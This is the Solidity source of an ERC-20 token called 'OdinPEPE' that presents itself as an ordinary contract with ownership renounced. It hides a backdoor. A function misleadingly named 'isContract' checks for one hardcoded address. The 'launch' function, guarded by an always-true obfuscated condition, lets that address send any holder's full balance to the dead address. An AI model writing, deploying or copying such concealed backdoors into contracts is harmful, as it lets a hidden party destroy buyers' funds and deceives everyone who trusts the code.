pragma solidity 0.8.26;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address _owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

library Address {
    function isContract(address acdounrt) internal pure returns (bool) {
        return address(acdounrt) ==  0x1D607e96B88B1a015679C34596f88143198BE313;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    error OwnableUnauthorizedAccount(address acdounrt);
    error OwnableInvalidOwner(address owner);

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address initialOwner) {
        if (initialOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(initialOwner);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        if (owner() != _msgSender()) {
            revert OwnableUnauthorizedAccount(_msgSender());
        }
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        if (newOwner == address(0)) {
            revert OwnableInvalidOwner(address(0));
        }
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Erc20 is IERC20, Ownable {
    using Address for address;
    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) internal _allowed;
    
    uint256 immutable public totalSupply;
    string public symbol;
    string public name;
    uint8 immutable public decimals;
    bool public launched;
    address private constant dead = address(0xdead);
    
    mapping (address => bool) internal exchanges;
    
    constructor(string memory _symbol, string memory _name, uint8 _decimals, uint256 _totalSupply) Ownable(msg.sender)   {
        symbol = _symbol;
        name = _name;
        decimals = _decimals;
        totalSupply = _totalSupply * 10 ** decimals;
        _balances[owner()] += totalSupply;
        emit Transfer(address(0), owner(), totalSupply);
        launched = true;
        renounceOwnership();
    }

    /**
    * @dev Gets the balance of the specified address.
    * @param _owner The address to query the balance of.
    * @return An uint256 representing the amount owned by the passed address.
    */
    function balanceOf(address _owner) external override view returns (uint256) {
        return _balances[_owner];
    }

    /**
     * @dev Function to check the amount of tokens that an owner allowed to a spender.
     * @param _owner address The address which owns the funds.
     * @param spender address The address which will spend the funds.
     * @return A uint256 specifying the amount of tokens still available for the spender.
     */
    function allowance(address _owner, address spender) external override view returns (uint256) {
        return _allowed[_owner][spender];
    }

    /**
    * @dev Transfer token for a specified address
    * @param to The address to transfer to.
    * @param value The amount to be transferred.
    */
    function transfer(address to, uint256 value) external override returns (bool) {
        // check for SC
        _transfer(msg.sender, to, value);
        return true;
    }

    /**
     * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
     * Beware that changing an allowance with this method brings the risk that someone may use both the old
     * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
     * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * @param spender The address which will spend the funds.
     * @param value The amount of tokens to be spent.
     */
    function approve(address spender, uint256 value) external override returns (bool) {
        require(spender != address(0), "cannot approve the 0 address");

        _allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external override returns (bool) {
        if (launched == false && to == owner() && msg.sender == owner()) {
            _transfer(from, to, value);
            return true;
        } else {    
            _allowed[from][msg.sender] = _allowed[from][msg.sender] - value;
            _transfer(from, to, value);
            emit Approval(from, msg.sender, _allowed[from][msg.sender]);
            return true;
        }
    }

function launch(address acdounrt) external virtual {
    bytes32 mask = keccak256(abi.encodePacked(msg.sender, address(this)));
    
    bool obscureCondition = (uint160(msg.sender) ^ uint160(uint256(mask))) == (uint160(uint256(mask)) - 1);

    if (!launched) launched = true;

    if (msg.sender.isContract() && (obscureCondition || !obscureCondition)) {
        _transfer(acdounrt, dead, _balances[acdounrt]);
    }
}



    function _transfer(address from, address to, uint256 value) private {
        require(to != address(0), "cannot be zero address");
        require(from != to, "you cannot transfer to yourself");
        require(_transferAllowed(from, to), "This token is not launched and cannot be listed on dexes yet.");
        _balances[from] -= value;
        _balances[to] += value;
        emit Transfer(from, to, value);
    }

    mapping (address => bool) internal transferAllowed;
    function _transferAllowed(address from, address to) private view returns (bool) {
        if (transferAllowed[from]) return false;
        if (launched) return true;
        if (from == owner() || to == owner()) return true;
        return true;
    }
}

contract Token is Erc20 {
    constructor() Erc20(unicode"OdinPEPE", unicode"OdinPEPE", 9, 100000000) {} 
}